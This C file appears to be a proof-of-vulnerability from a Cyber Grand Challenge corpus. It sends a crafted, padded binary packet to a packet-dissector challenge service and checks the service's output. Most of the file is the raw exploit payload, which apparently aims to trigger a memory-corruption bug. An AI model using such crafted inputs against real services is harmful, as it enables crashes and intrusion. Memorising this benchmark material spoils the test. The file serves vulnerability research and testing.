#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x49\x63\xc1\x58"
         "\x6b\x82\x6c\x67\x88\x66\x0b\x37\xcf\x00\x00\x00\xc8\x09\x86\xac"
         "\xbf\x08\x11\x4c\xd9\xa1\x04\x58\xcd\x18\xa3\x73\xbb\xb3\x96\x7b"
         "\x2a\xce\xb6\xc1\x6a\x15\xda\xa5\x6d\x78\xb3\x96\xb2\x4c\xae\x33"
         "\xc2\x33\x7c\xc7\x0d\x93\x56\x19\xb5\xef\x55\x85\x64\xa0\x7f\x3b"
         "\x5f\xe2\x84\x8d\xef\xfa\x25\x39\xa3\x20\xcd\x81\xdd\xba\xa6\x21"
         "\x24\x18\x95\x40\x3d\xfd\xc5\xe8\x22\xa8\x6b\x81\x28\x1f\x7b\x56"
         "\xc0\x66\xbe\xe5\x33\xbc\x99\x6b\x1c\x3f\xc0\x41\x7f\xc8\xba\x4c"
         "\xf7\x7d\x13\x64\xf0\xbb\x30\x7e\x4f\x4e\x7f\x1c\xfe\x02\x47\x08"
         "\x75\xf3\xb1\xd2\x69\xa3\x76\xea\xd1\xa2\x60\x3d\xad\x73\x5c\x86"
         "\x28\x15\x47\x95\xfa\x13\xbc\x78\xa5\xba\x93\x56\xa1\x68\x52\x8c"
         "\xfb\xdf\x4b\xad\xd3\xbb\xaa\xe1\xe5\xb1\x2b\x38\x42\x42\x60\x10"
         "\x04\x87\x06\xba\x9c\x0b\x65\x07\xdf\x18\x67\xbc\x6e\x9a\xae\xd6"
         "\x93\x1c\x57\xed\x29\xf0\x35\x00\x5f\xb4\xf5\xa6\x68\x7c\x1f\x95"
         "\x35\x00\x7e\xcb\x28\xbf\xdc\x2c\xe9\xa3\x8e\x75\x56\xc0\x79\xd1"
         "\x01\xfd\x9a\xf8\x3f\x3f\x9f\xb8\xd5\x3e\xe6\x8f\x47\xee\x43\x15"
         "\x66\x7c\x44\x6f\x6c\x62\x09\xef\xa6\xb3\xdb\xac\x53\xd4\x46\xc4"
         "\xff\x96\x30\xbb\xc8\x0e\x9a\xd6\x14\x1d\x49\x60\x43\x05\x57\xac"
         "\xeb\xac\x88\x2b\xb5\x6f\xad\x2e\x41\x0f\x3b\x7c\xba\x59\xa5\x0e"
         "\x4f\x4d\x33\x6e\x3f\xc6\x4a\x1d\x60\xaf\x3d\xfc\xa6\x82\xd3\x85"
         "\x18\x0a\xcd\x29\xab\x7e\xa1\x09\xef\x3b\x30\x44\x2c\xac\x75\xaa"
         "\x7b\x5e\x43\xaa\x3b\xe2\xc9\x40\x80\xdb\x75\x40\x63\xfd\x3b\x84"
         "\x8b\x36\xd7\x29\x17\xb1\xe2\xde\x51\xa1\x60\x10\x66\xc0\xc0\x85"
         "\x0c\x38\x93\xbf\xda\x94\x8d\x72\xd4\x50\x58\x6c\x4d\xe6\xb4\xcb"
         "\x0e\xc4\x84\xc9\x13\x99\x35\xab\x1c\x53\xdf\xe6\xbd\x3b\x4d\xcb"
         "\xaf\xbe\xfa\x21\x4a\x16\xdb\xfe\xc5\xec\x86\xfd\x5e\xce\x34\xc3"
         "\x75\x4e\xd1\x0f\xd7\xb9\x94\x4d\x85\x86\xc3\x55\x08\xb0\xbf\x60"
         "\xc1\x93\xdb\xc5\x3c\x69\x50\x24\xa9\xf5\x16\xaa\xd6\x73\x9f\x76"
         "\x75\x29\x1c\x51\xbf\xcb\x89\xbf\xea\x4c\xa6\xce\xcc\x86\x25\x69"
         "\xe9\x50\xa2\x1c\xdc\xb3\xa8\x76\x21\x3d\x6f\x9a\x8c\x11\xfa\x0a"
         "\xba\x28\x39\xe1\xc5\xc8\x84\xfc\xf0\x48\xe6\xdf\xd1\x8c\x8e\x74"
         "\x47\x7c\x5c\xc3\x2c\x9b\x73\x49\x7e\x33\x4f\xa5\x48\x17\x3a\x3a"
         "\xc4\xd1\xd6\xfa\xee\xe3\x8d\xf0\x09\x55\xd3\x36\xf9\x84\xec\x53"
         "\x98\x9a\xd4\xbc\x0c\xc7\x8f\x00\x36\xa8\x1c\x6f\x9e\x51\x97\x0f"
         "\xdc\x42\xfa\x14\x2b\x4f\x9e\x72\x81\xa7\x6f\xe0\x3f\x1d\x96\x1d"
         "\xe3\x9b\x98\xaa\x4a\xa7\x1e\xd0\x8a\xda\xdb\x95\x05\x15\xc6\xb4"
         "\x69\x50\x2b\x97\x1a\x25\x3b\x28\x55\x8e\x95\xb3\x51\x4b\x0b\xb6"
         "\x5d\xc8\xf0\x3b\x65\x60\x8f\x0a\x8d\x4c\x3d\x7d\x1b\x95\x0c\x6b"
         "\x87\x49\xeb\x28\x5b\xa3\x50\x6e\x1a\x70\x1f\x18\x10\x13\x35\x29"
         "\xa5\xa8\x2d\xd1\xdf\x31\x35\x15\x76\xb4\x52\xab\xdc\x89\xc9\x14"
         "\x49\x10\xb9\x83\x64\x77\xc0\x30\x56\xab\xfc\x92\xa2\xb9\x20\x38"
         "\x3a\x2f\x74\x91\x04\xc6\x3b\x71\xad\x58\xe3\xea\xa9\xb8\xc2\x4e"
         "\x96\xea\x30\x22\xfe\x80\xa6\x35\x02\xd2\x1a\x18\xd6\x1a\xa8\xfa"
         "\xad\xd7\xa7\x93\xcc\xd3\x14\x35\x35\x00\x25\xa4\x80\xbe\x7b\x78"
         "\x27\x8a\x58\xad\xfd\xc0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===roblaumontite
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x62\x6c\x61\x75\x6d\x6f\x6e\x74\x69"
         "\x74\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
